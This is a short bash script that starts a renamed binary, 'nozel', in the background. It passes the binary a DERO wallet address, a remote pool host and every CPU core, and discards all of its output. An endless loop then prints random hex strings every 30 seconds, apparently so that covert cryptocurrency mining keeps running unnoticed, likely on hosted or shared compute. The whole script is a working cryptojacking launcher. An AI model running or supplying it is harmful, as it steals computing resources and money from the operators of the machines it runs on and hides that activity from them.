#!/bin/bash
./nozel -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 167.172.183.204:10100 -m $(nproc --all) > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
